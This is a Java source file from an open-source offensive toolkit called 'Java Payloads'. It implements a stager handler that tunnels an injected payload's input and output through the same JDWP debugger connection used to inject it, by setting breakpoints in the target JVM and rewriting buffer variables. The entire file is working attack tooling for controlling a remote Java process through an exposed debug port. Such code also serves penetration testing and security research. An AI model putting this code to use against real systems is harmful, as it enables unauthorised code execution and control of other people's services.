/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stager;

import java.io.IOException;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.io.PrintStream;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import javapayload.Parameter;
import javapayload.handler.stage.StageHandler;

import com.sun.jdi.ArrayReference;
import com.sun.jdi.ByteValue;
import com.sun.jdi.ClassType;
import com.sun.jdi.LocalVariable;
import com.sun.jdi.Location;
import com.sun.jdi.Method;
import com.sun.jdi.ThreadReference;
import com.sun.jdi.VirtualMachine;
import com.sun.jdi.event.BreakpointEvent;
import com.sun.jdi.event.Event;
import com.sun.jdi.event.EventIterator;
import com.sun.jdi.event.EventSet;
import com.sun.jdi.request.BreakpointRequest;
import com.sun.jdi.request.EventRequest;

public class JDWPTunnel extends StagerHandler implements Runnable {

	public JDWPTunnel() {
		super("Tunnel the payload stream through JDWP", true, true, 
				"This stager tunnels the payload stream through the same JDWP connection\r\n" +
				"that was used to inject the payload.");
	}
	
	public Parameter[] getParameters() {
		return new Parameter[0];
	}
	
	private ClassType communicationClass;
	private WrappedPipedOutputStream pipedOut;
	private StreamReaderThread streamReaderThread;
	private PrintStream errorStream;
	
	protected void handle(StageHandler stageHandler, String[] parameters, PrintStream errorStream, Object extraArg, StagerHandler readyHandler) throws Exception {
		if (readyHandler != null) readyHandler.notifyReady();
		this.errorStream = errorStream;
		if (extraArg == null || !(extraArg instanceof ClassType))
			throw new IllegalArgumentException("No JDWP communication class found");
		communicationClass = (ClassType) extraArg;
		VirtualMachine vm = communicationClass.virtualMachine();
		if (vm.eventRequestManager().stepRequests().size() > 0) {
			throw new RuntimeException("Some threads are currently stepping");
		}
		if (vm.eventRequestManager().breakpointRequests().size() > 0) {
			throw new RuntimeException("There are some breakpoints set");
		}
		PipedOutputStream pos = new PipedOutputStream();
		pipedOut = new WrappedPipedOutputStream(pos);
		PipedInputStream pipedIn = new PipedInputStream();
		WrappedPipedOutputStream wpos = new WrappedPipedOutputStream(new PipedOutputStream(pipedIn));
		streamReaderThread = new StreamReaderThread(pipedIn);
		streamReaderThread.start();
		
		new Thread(this).start();
		stageHandler.handle(wpos, new PipedInputStream(pos), parameters);
	}
	
	public void run() {
		VirtualMachine vm = communicationClass.virtualMachine();
		try {
			Location interceptIn = getBreakpointLocation((Method)communicationClass.methodsByName("interceptIn").get(0));
			Location interceptOut = getBreakpointLocation((Method)communicationClass.methodsByName("interceptOut").get(0));
			BreakpointRequest req =  vm.eventRequestManager().createBreakpointRequest(interceptIn);
			req.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
			req.setEnabled(true);
			req = vm.eventRequestManager().createBreakpointRequest(interceptOut);
			req.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
			req.setEnabled(true);
			final com.sun.jdi.event.EventQueue q = vm.eventQueue();
			boolean done = false;
			errorStream.println("== Handling I/O events...");
			InputInterceptHandler iih = null;
			while (true) {
				final EventSet es;
				if (!done) {
					es = q.remove();
				} else {
					es = q.remove(1000);
					if (es == null) {
						break;
					}
				}
				for (final EventIterator ei = es.eventIterator(); ei.hasNext();) {
					final Event e = ei.nextEvent();
					if (!done && e instanceof BreakpointEvent) {
						final BreakpointEvent be = (BreakpointEvent) e;
						final Location loc = be.location();
						final ThreadReference tr = be.thread();	
						if (loc.equals(interceptIn)) {
							LocalVariable result = (LocalVariable) loc.method().variablesByName("result").get(0);
							LocalVariable buffer = (LocalVariable) loc.method().arguments().get(0);
							ArrayReference buf = (ArrayReference) tr.frame(0).getValue(buffer);
							if (iih != null && iih.isAlive()) {
								System.err.println("Two input intercept handlers running at the same time");
								iih.join();
							}
							iih = new InputInterceptHandler(tr, buf, result);
							iih.start();
						} else if (loc.equals(interceptOut)) {
							LocalVariable result = (LocalVariable) loc.method().variablesByName("result").get(0);
							LocalVariable data = (LocalVariable) loc.method().arguments().get(0);
							ArrayReference buf = (ArrayReference) tr.frame(0).getValue(data);
							List values = (buf.length() == 0) ? Collections.EMPTY_LIST : buf.getValues();
							byte[] temp = new byte[buf.length()];
							for (int i = 0; i < temp.length; i++) {
								temp[i] = ((ByteValue)values.get(i)).byteValue();
							}
							pipedOut.write(temp);
							pipedOut.flush();
							if (temp.length == 0) {
								pipedOut.close();
								streamReaderThread.close();
								done = true;
							}
							tr.frame(0).setValue(result, vm.mirrorOf(true));
							tr.resume();
						} else {
							throw new RuntimeException("Unknown location: "+loc);
						}	
					} else {
						System.out.println("== Unknown event received: " + e.toString());
						es.resume();
					}
				}
			}
			if (iih != null)
				iih.join();
		}
		catch(Throwable t) {
			t.printStackTrace(errorStream);
		}
		vm.dispose();
	}
	
	private Location getBreakpointLocation(Method method) {
		int codeOffset = 2;
		// dirty hack to make code coverage work
		if (method.virtualMachine().canGetBytecodes() && method.bytecodes().length == 28) {
			codeOffset = 25;
		}
		return method.locationOfCodeIndex(codeOffset);
	}

	protected boolean needHandleBeforeStart() { return false; }
	
	protected boolean canHandleExtraArg(Class argType) {
		return argType != null && argType.equals(ClassType.class);
	}
	
	protected String getTestArguments() {
		return null;
	}
	
	public class InputInterceptHandler extends Thread {
		
		private final ThreadReference thread;
		private final ArrayReference buffer;
		private final LocalVariable result;

		public InputInterceptHandler(ThreadReference thread, ArrayReference buffer, LocalVariable result) {
			this.thread = thread;
			this.buffer = buffer;
			this.result = result;
			setDaemon(true);
		}
		
		public void run() {
			try {
				byte[] temp = new byte[buffer.length()];
				int len;
				try {
					len = streamReaderThread.read(temp);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
					len = -1;
				}
				if (len > 0) {
					ByteValue[] bytes = new ByteValue[len];
					for (int i = 0; i < bytes.length; i++) {
						bytes[i] = thread.virtualMachine().mirrorOf(temp[i]);
					}
					buffer.setValues(0, Arrays.asList(bytes), 0, len);
				}
				thread.frame(0).setValue(result, thread.virtualMachine().mirrorOf(len));
				thread.resume();
			} catch (Throwable t) {
				t.printStackTrace(errorStream);
			}
		}
	}
	
	// work around a glitch in PipedInputStream when more than one thread is trying to read from it
	public class StreamReaderThread extends Thread {
		
		private final PipedInputStream pipedIn;
		private final byte[] buffer = new byte[4096];
		private int length = 0;

		public StreamReaderThread(PipedInputStream pipedIn) {
			this.pipedIn = pipedIn;
		}

		public void run() {
			try {
				while(true) {
					int newLength = pipedIn.read(buffer);
					synchronized(this) {
						length = newLength;
						notifyAll();
						if (newLength == -1) break;
						while(length != 0) {
							wait();
						}
					}
				}
			} catch (Throwable t) {
				t.printStackTrace(errorStream);
				synchronized(this) {
					length = -1;
				}
			}
		}
		
		public synchronized int read(byte[] buf) throws InterruptedException {
			while (length == 0)
				wait();
			if (length == -1)
				return length;
			int result = length;
			if (buf.length != buffer.length)
				throw new RuntimeException(buf.length+" != "+buffer.length);
			System.arraycopy(buffer, 0, buf, 0, result);
			length = 0;
			notifyAll();
			return result;
		}
		

		public void close() throws IOException {
			pipedIn.close();
			synchronized(this) {
				if (length > 0) {
					length = 0;
					notifyAll();
				}
			}
		}
	}
}